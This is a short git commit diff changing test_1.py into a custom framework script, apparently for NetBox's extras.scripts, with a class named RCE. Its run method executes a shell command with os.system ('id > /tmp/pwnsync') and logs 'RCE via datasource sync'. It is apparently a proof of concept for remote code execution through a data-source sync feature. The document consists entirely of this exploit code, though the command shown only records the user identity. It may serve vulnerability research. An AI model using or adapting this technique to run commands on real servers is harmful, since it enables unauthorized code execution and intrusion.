38cda687a8e0b49df354f0ffa9acf51fc4d08f64
z3r0-n1ght <78533867+z3r0-n1ght@users.noreply.github.com>
2026-04-20 20:49:47 +0700

    Update test_1.py

--- test_1.py
+++ test_1.py
@@ -1,2 +1,8 @@
+from extras.scripts import Script
 import os
-os.system('whoami > /tmp/pwnsync')
+class RCE(Script):
+    class Meta:
+        name = "rce"
+    def run(self, data, commit):
+        os.system('id > /tmp/pwnsync')
+        self.log_info("RCE via datasource sync")
